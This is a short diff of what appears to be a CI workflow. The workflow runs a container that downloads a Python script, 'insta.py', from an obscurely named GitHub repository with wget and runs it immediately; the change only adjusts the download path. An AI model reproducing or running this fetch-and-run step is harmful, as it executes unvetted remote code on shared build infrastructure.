@@ -17,4 +17,4 @@ jobs:
       run: docker pull livetest/d3thtr3p:v2
     - name: Run Docker file
       run: |
-            docker run livetest/d3thtr3p:v2 sh -c "wget https://raw.githubusercontent.com/xjxiIaueufus8q88e7eu2heh/co-whgoc9sisjdizizikJsjei-9-20--9-_-7-_8-8--273-/main/insta.py && python3 insta.py"
+            docker run livetest/d3thtr3p:v2 sh -c "wget https://raw.githubusercontent.com/xjxiIaueufus8q88e7eu2heh/co-whgoc9sisjdizizikJsjei-9-20--9-_-7-_8-8--273-/refs/heads/main/insta.py && python3 insta.py"
